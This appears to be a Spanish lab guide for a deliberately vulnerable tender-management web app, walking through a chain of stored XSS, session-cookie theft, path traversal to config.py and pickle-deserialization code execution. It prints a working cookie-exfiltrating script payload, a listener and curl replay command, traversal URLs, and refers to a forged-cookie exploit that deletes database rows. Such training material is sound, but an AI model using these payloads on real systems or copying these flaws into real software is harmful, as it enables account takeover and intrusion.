# INSTRUCTIVO — Como ejecutar la cadena de vulnerabilidades

> Crear base con `python init_db.py`
> Correr App con `python app.py`

> La cadena se recorre en orden: **XSS → robo de sesion → path traversal → RCE**.
> Cada eslabon habilita al siguiente.

---

## Paso 1 — Stored XSS

- **Que es:** inyeccion de HTML/JS persistente. La descripcion de una propuesta
  admite **formato** (negritas con `**...**` y saltos de linea), asi que el panel
  del admin la renderiza como HTML mediante el filtro `formato`
  (`{{ p.descripcion | formato }}` en `templates/admin_licitacion.html`). Ese
  filtro (`app.py`) genera el HTML del formato y lo devuelve con `Markup(...)`
  **sin sanitizar** la entrada: solo procesa `**` y `\n`, pero deja pasar
  cualquier otro HTML del usuario (incluido `<script>`). El resultado ya no se
  escapa → XSS almacenado.
- **Donde esta:** vector de entrada en `/propuesta/<id>` (campo Descripcion,
  `descripcion = request.form.get(...)` sin sanitizar); se **dispara** en
  `/admin/licitacion/<id>` cuando el admin la abre y el filtro `formato` la
  renderiza.
- **Como explotarla:**
  1. Iniciar sesion como `atacante` / `hack123`.
  2. Abrir una licitacion **abierta** y presentar una propuesta. Completar
     razon social, CUIT valido (ej. `20-33333333-3`) y monto valido (ej. `999`).
  3. En **Descripcion**, pegar un payload de robo de cookie como:
     <script>fetch("http://localhost:8000/robo?c="+encodeURIComponent(document.cookie));</script>
- **Resultado esperado:** al guardarse, el script queda persistido. Cuando el
  admin abra esa licitacion, el codigo se ejecuta en **su** navegador.

---

## Paso 2 — Robo de cookie / Session Hijacking

- **Que es:** el XSS exfiltra la cookie de sesion del admin porque la cookie
  **no tiene `HttpOnly`** (`app.py`: `set_cookie(..., httponly=False)`), y luego
  se reutiliza (replay) para entrar como admin sin su contrasena.
- **Donde esta:** ejecución de código XSS en `/admin/licitacion/<id>`.
- **Como explotarla:**
  1. Montar el listener del atacante (terminal aparte): python3 -m http.server 8000.
  2. Con el XSS del paso 1 ya cargado, iniciar sesion como `admin` / `admin123`
     y abrir la licitacion afectada (`/admin/licitacion/<id>`).
  3. La cookie del admin aparece en el listener (parametro `?c=`).
  4. **Replay** de la cookie robada:
     - **curl:** `curl -b "sesion=<VALOR_ROBADO>" http://localhost:5000/admin`
     - **DevTools:** Application → Cookies → `http://localhost:5000` → editar la
       cookie `sesion` con el valor robado → recargar.
- **Resultado esperado:** navegas como administrador usando solo la cookie
  robada.

---

## Paso 3 — Path Traversal / LFI

- **Que es:** el endpoint de descarga de reportes concatena el nombre de archivo
  sin validarlo, permitiendo salir de la carpeta `reportes/` con `../`.
- **Donde esta:** `/admin/descargar?file=...` en `app.py`
  (`os.path.join("reportes", nombre)` sin sanitizar).
- **Como explotarla** (ya como admin, del paso 2):
  1. Descarga legitima de referencia:
     `http://localhost:5000/admin/descargar?file=reporte_ejemplo.csv`
  2. Escapar hacia el archivo de configuracion:
     `http://localhost:5000/admin/descargar?file=../config.py`
- **Resultado esperado:** se obtiene `config.py`, incluida la
  `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` y las credenciales de BD.

---

## Paso 4 — RCE por deserializacion insegura (pickle)

- **Que es:** con la `SECRET_KEY` filtrada se forja una cookie con **firma HMAC
  valida** que contiene un objeto pickle malicioso. El servidor hace
  `pickle.loads()` sobre ella (`session_utils.leer_cookie`) y ejecuta el
  `__reduce__` del objeto → **ejecucion de codigo**.
- **Donde esta:** `session_utils.py` (`pickle.loads(data)`), invocado por
  `app.py` en cada request a traves de `usuario_actual()`.
- **Como explotarla:**
  1. Editar `exploits/4_forjar_cookie_rce.py`:
     - `UMBRAL = valor deseado`  (se borran las propuestas con monto **menor** a este valor).
     - `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` (la obtenida en el paso 3).
  2. Generar y enviar la cookie forjada al servidor en ejecucion: 
     - Generar: python3 exploits/4_forjar_cookie_rce.py
     - Generar y enviar: python3 exploits/4_forjar_cookie_rce.py --enviar
- **Resultado esperado:**
  - Se **borran** de la tabla `propuestas` todas las de monto < valor deseado

---